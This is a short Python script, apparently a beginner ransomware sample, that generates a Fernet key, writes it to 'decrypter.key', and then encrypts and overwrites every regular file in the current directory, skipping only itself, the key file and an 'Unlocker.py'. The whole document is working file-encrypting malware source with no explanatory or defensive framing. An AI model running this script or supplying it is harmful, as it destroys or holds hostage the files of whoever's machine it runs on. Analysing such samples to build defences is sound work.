import os
from cryptography.fernet import Fernet

files = []
key = Fernet.generate_key()

for file in os.listdir():
    if file == "ransomware.py" or file == "decrypter.key" or file == "Unlocker.py":
        continue
    if os.path.isfile(file):
        files.append(file)

with open("decrypter.key", "wb") as decrypter:
    decrypter.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)


